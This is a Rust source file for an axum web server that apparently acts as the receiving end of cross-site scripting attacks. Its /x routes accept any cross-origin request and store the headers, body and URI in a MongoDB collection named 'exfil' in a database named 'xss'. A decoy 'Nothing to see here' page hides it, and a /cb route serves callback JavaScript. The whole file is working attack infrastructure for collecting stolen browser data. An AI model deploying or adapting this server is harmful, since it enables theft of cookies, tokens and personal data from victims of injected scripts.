#![feature(lazy_cell)]
use std::{collections::HashMap, sync::LazyLock};

use anyhow::Result;
use axum::{
    body::{Body, Bytes, HttpBody},
    extract::State,
    routing::any,
    Router, response::IntoResponse,
};

use clap::Parser;
use http::{Request, StatusCode};
use mongodb::Client;
use serde::{Deserialize, Serialize};
use tokio::fs::{self, create_dir_all};
use tower_http::{
    cors::{Any, CorsLayer},
    services::{ServeDir, ServeFile},
    trace::{DefaultMakeSpan, DefaultOnFailure, DefaultOnRequest, DefaultOnResponse, TraceLayer},
};
use tracing::Level;
#[derive(Parser)]
struct Config {
    #[clap(short, long, env)]
    mongo_uri: String,
}

static CONFIG: LazyLock<Config> = LazyLock::new(Config::parse);

#[tokio::main]
async fn main() -> Result<()> {
    let client = Client::with_uri_str(&CONFIG.mongo_uri).await?;
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();
    let trace_layer = TraceLayer::new_for_http()
        .make_span_with(
            DefaultMakeSpan::new()
                .include_headers(false)
                .level(Level::INFO),
        )
        .on_request(DefaultOnRequest::new().level(Level::INFO))
        .on_response(DefaultOnResponse::new().level(Level::INFO))
        .on_failure(DefaultOnFailure::new().level(Level::ERROR));

    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any)
        .allow_private_network(true)
        .expose_headers(Any);

    create_dir_all("static").await?;
    if !fs::try_exists("static/index.html").await? {
        fs::write(
                "static/index.html",
                br#"<html><head><title>My Site</title></head><body><p>Nothing to see here</p></body></html>"#,
            ).await?;
    }

    let serve_dir = ServeDir::new("static");
    let index = ServeFile::new("static/index.html");

    let app = Router::new()
        .route("/x", any(exfil))
        .route("/x/*rest", any(exfil))
        .route("/cb", any(call_back))
        .nest_service("/static", serve_dir.clone())
        .fallback_service(index)
        .layer(cors)
        .layer(trace_layer)
        .with_state(client);

    let addr = "0.0.0.0:8000".parse()?;
    tracing::info!("listening on {}", addr);
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await?;
    Ok(())
}

#[derive(Debug, Serialize, Deserialize)]
#[serde(untagged)]
enum StrOrBytes {
    Str(String),
    Bytes(Vec<u8>),
}

#[derive(Debug, Serialize, Deserialize)]
struct ExfilData {
    data: StrOrBytes,
    headers: HashMap<String, StrOrBytes>,
    uri: String,
}

async fn exfil(
    State(client): State<Client>,
    mut request: Request<Body>,
) -> Result<StatusCode, StatusCode> {
    let coll = client.database("xss").collection::<ExfilData>("exfil");
    let headers: HashMap<_, _> = request
        .headers()
        .iter()
        .map(|(k, v)| {
            (
                k.to_string(),
                match v.to_str() {
                    Ok(v) => StrOrBytes::Str(v.to_string()),
                    Err(_) => StrOrBytes::Bytes(v.as_bytes().to_vec()),
                },
            )
        })
        .collect();
    let body: Vec<u8> = request
        .body_mut()
        .data()
        .await
        .unwrap_or(Ok(Bytes::new()))
        .or(Err(StatusCode::INTERNAL_SERVER_ERROR))?
        .to_vec();
    let data = match std::str::from_utf8(&body) {
        Ok(s) => StrOrBytes::Str(s.to_string()),
        Err(_) => StrOrBytes::Bytes(body),
    };
    let doc: ExfilData = ExfilData {
        data,
        headers,
        uri: request.uri().to_string(),
    };
    coll.insert_one(doc, None)
        .await
        .or(Err(StatusCode::INTERNAL_SERVER_ERROR))?;
    Ok(StatusCode::OK)
}

async fn call_back() -> impl IntoResponse {
    "console.log('Hello, world!')"
}